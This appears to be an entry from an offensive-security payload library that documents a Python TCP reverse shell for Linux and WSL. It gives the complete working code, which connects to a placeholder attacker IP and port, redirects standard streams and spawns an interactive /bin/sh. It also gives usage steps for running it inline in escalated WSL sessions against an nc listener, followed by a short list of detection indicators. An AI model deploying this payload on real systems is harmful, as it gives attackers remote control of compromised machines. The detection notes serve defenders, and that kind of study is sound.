---
id: new-uuid-for-python-shell
name: python-tcp-reverse-shell
type: code
language: python
verified: true
created_at: '2023-04-06T03:56:29.607477+00:00'
updated_at: '2023-04-10T20:37:54.961225+00:00'
platforms:
  - Linux
tags:
  - reverse-shell
  - payload
validated: true
---

# python-tcp-reverse-shell

## Code

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$ATTACKER_IP",$ATTACKER_PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

## Description

A simple Python TCP reverse shell that connects from the target (WSL) to an attacker listener, redirects stdin/stdout/stderr, and spawns an interactive shell. Ideal for post-escalation access in Linux environments like WSL Ubuntu.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $ATTACKER_IP | IP address of the attacker's listener | 192.168.1.100 |
| $ATTACKER_PORT | Port on which the listener is bound | 4444 |

## Usage

Substitute variables and execute via 'python3 -c "code"' in WSL. Start listener with 'nc -lvnp $ATTACKER_PORT' on attacker machine. Delivered via inline execution in escalated WSL sessions.

## Detection

- Python process spawning /bin/sh.
- Outbound TCP connections from wsl.exe to unusual IPs/ports.
- Sysmon events for python3.exe network activity.

## Related

- [[procedures/WSL-Privilege-Escalation-via-Default-User-Modification]]
- [[commands/execute-wsl-python-reverse-shell]]
